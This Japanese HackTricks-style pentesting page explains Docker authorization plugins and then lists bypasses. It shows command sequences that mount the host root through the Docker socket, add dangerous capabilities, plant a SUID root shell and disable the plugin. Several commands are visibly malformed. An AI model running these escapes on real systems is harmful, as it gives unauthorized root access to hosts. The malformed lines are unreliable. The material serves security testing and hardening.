{{#include ../../../banners/hacktricks-training.md}}

**Docker**の標準**認可**モデルは**全か無か**です。Dockerデーモンにアクセスする権限を持つユーザーは、**任意の**Dockerクライアント**コマンド**を**実行**できます。DockerのエンジンAPIを使用してデーモンに接続する呼び出し元についても同様です。**より高いアクセス制御**が必要な場合は、**認可プラグイン**を作成し、Dockerデーモンの設定に追加できます。認可プラグインを使用することで、Docker管理者はDockerデーモンへのアクセスを管理するための**詳細なアクセス**ポリシーを**設定**できます。

# 基本アーキテクチャ

Docker Authプラグインは、**外部**の**プラグイン**であり、**ユーザー**や**要求されたアクション**に応じて、Dockerデーモンに対する**アクション**の**許可/拒否**を行うことができます。

**[以下の情報はドキュメントからのものです](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

**HTTP** **リクエスト**がCLIまたはエンジンAPIを介してDocker **デーモン**に送信されると、**認証** **サブシステム**はリクエストをインストールされた**認証** **プラグイン**に**渡します**。リクエストにはユーザー（呼び出し元）とコマンドのコンテキストが含まれています。**プラグイン**は、リクエストを**許可**するか**拒否**するかを決定する責任があります。

以下のシーケンス図は、許可と拒否の認可フローを示しています：

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz_deny.png)

プラグインに送信される各リクエストには、**認証されたユーザー、HTTPヘッダー、およびリクエスト/レスポンスボディ**が含まれます。**ユーザー名**と**使用された認証方法**のみがプラグインに渡されます。最も重要なことは、**ユーザーの** **資格情報**やトークンは渡されないことです。最後に、**すべてのリクエスト/レスポンスボディが**認可プラグインに送信されるわけではありません。`Content-Type`が`text/*`または`application/json`であるリクエスト/レスポンスボディのみが送信されます。

HTTP接続をハイジャックする可能性のあるコマンド（`HTTP Upgrade`）については、`exec`のように、認可プラグインは初期のHTTPリクエストに対してのみ呼び出されます。プラグインがコマンドを承認すると、その後のフローには認可が適用されません。具体的には、ストリーミングデータは認可プラグインに渡されません。`logs`や`events`のようにチャンク化されたHTTPレスポンスを返すコマンドについては、HTTPリクエストのみが認可プラグインに送信されます。

リクエスト/レスポンス処理中に、一部の認可フローはDockerデーモンに追加のクエリを行う必要があるかもしれません。そのようなフローを完了するために、プラグインは通常のユーザーと同様にデーモンAPIを呼び出すことができます。これらの追加クエリを有効にするために、プラグインは管理者が適切な認証とセキュリティポリシーを設定できる手段を提供する必要があります。

## 複数のプラグイン

あなたは、Dockerデーモンの**起動**の一部として**プラグイン**を**登録**する責任があります。**複数のプラグインをインストールし、それらを連結**することができます。このチェーンは順序付けることができます。デーモンへの各リクエストは、順番にチェーンを通過します。**すべてのプラグインがリソースへのアクセスを許可**したときのみ、アクセスが許可されます。

# プラグインの例

## Twistlock AuthZ Broker

プラグイン [**authz**](https://github.com/twistlock/authz) は、**リクエストを認可するために**プラグインが**読み取る**シンプルな**JSON**ファイルを作成することを可能にします。したがって、どのAPIエンドポイントが各ユーザーに到達できるかを非常に簡単に制御する機会を提供します。

これは、アリスとボブが新しいコンテナを作成できるようにする例です：`{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

ページ [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) では、要求されたURLとアクションの関係を見つけることができます。ページ [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) では、アクション名とアクションの関係を見つけることができます。

## シンプルなプラグインチュートリアル

インストールとデバッグに関する詳細情報を含む**理解しやすいプラグイン**は、こちらで見つけることができます：[**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

`README`と`plugin.go`のコードを読んで、どのように動作しているかを理解してください。

# Docker Auth Plugin Bypass

## アクセスの列挙

確認すべき主な点は、**どのエンドポイントが許可されているか**と**どのHostConfigの値が許可されているか**です。

この列挙を行うには、**ツール** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**を使用**できます。

## 許可されていない `run --privileged`

### 最小権限
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### コンテナを実行し、その後特権セッションを取得する

この場合、sysadminは**ユーザーがボリュームをマウントし、`--privileged`フラグを使用してコンテナを実行することを禁止した**り、コンテナに追加の権限を与えたりしました：
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
しかし、ユーザーは**実行中のコンテナ内にシェルを作成し、追加の権限を与えることができます**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
今、ユーザーは[**以前に議論した技術**](./#privileged-flag)を使用してコンテナから脱出し、ホスト内で**特権を昇格**させることができます。

## 書き込み可能なフォルダーをマウント

この場合、システム管理者は**ユーザーが`--privileged`フラグを使用してコンテナを実行することを禁止**し、コンテナに追加の機能を与えることを許可せず、`/tmp`フォルダーをマウントすることのみを許可しました。
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
> [!NOTE]
> `/tmp` フォルダーをマウントできない場合がありますが、**別の書き込み可能なフォルダー**をマウントできます。書き込み可能なディレクトリを見つけるには、`find / -writable -type d 2>/dev/null` を使用してください。
>
> **Linux マシンのすべてのディレクトリが suid ビットをサポートするわけではありません！** suid ビットをサポートするディレクトリを確認するには、`mount | grep -v "nosuid"` を実行します。例えば、通常 `/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup`、および `/var/lib/lxcfs` は suid ビットをサポートしていません。
>
> また、**`/etc`** または **設定ファイルを含む他のフォルダー** を **マウントできる** 場合、Docker コンテナ内で root としてそれらを変更し、**ホストで悪用して** 権限を昇格させることができます（例えば、`/etc/shadow` を変更すること）。

## チェックされていない API エンドポイント

このプラグインを設定する sysadmin の責任は、各ユーザーがどのアクションをどの権限で実行できるかを制御することです。したがって、管理者がエンドポイントと属性に対して **ブラックリスト** アプローチを取ると、攻撃者が **権限を昇格させる** 可能性のある **いくつかを忘れてしまう** かもしれません。

Docker API を確認するには、[https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) を参照してください。

## チェックされていない JSON 構造

### ルートのバインド

sysadmin が Docker ファイアウォールを設定したときに、[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) の "**Binds**" のような **重要なパラメータを忘れた** 可能性があります。\
次の例では、この誤設定を悪用して、ホストのルート (/) フォルダーをマウントするコンテナを作成して実行することができます。
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
> [!WARNING]
> この例では、**`Binds`** パラメータを JSON のルートレベルキーとして使用していますが、API では **`HostConfig`** キーの下に表示されることに注意してください。

### HostConfig の Binds

**ルートの Binds** と同様の指示に従い、Docker API にこの **リクエスト** を行います:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

**Binds in root** と同様の指示に従い、Docker API にこの **request** を実行します:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

**Binds in root**と同様に、Docker APIにこの**リクエスト**を行います:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## チェックされていないJSON属性

sysadminがdockerファイアウォールを設定した際に、[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)のパラメータの重要な属性である"**Capabilities**"を"**HostConfig**"内で**忘れた**可能性があります。次の例では、この誤設定を悪用して**SYS_MODULE**権限を持つコンテナを作成して実行することが可能です：
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
> [!NOTE]
> **`HostConfig`** は、通常、コンテナから脱出するための **興味深い** **特権** を含むキーです。しかし、前述のように、これの外で Binds を使用することも機能し、制限を回避できる可能性があることに注意してください。

## プラグインの無効化

もし **sysadmin** が **プラグイン** を **無効にする** 能力を **禁止するのを忘れた** 場合、これを利用して完全に無効化することができます！
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
プラグインを**特権昇格後に再有効化する**ことを忘れないでください。さもなければ、**dockerサービスの再起動は機能しません**！

## Auth Plugin Bypass の書き込み

- [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

{{#include ../../../banners/hacktricks-training.md}}
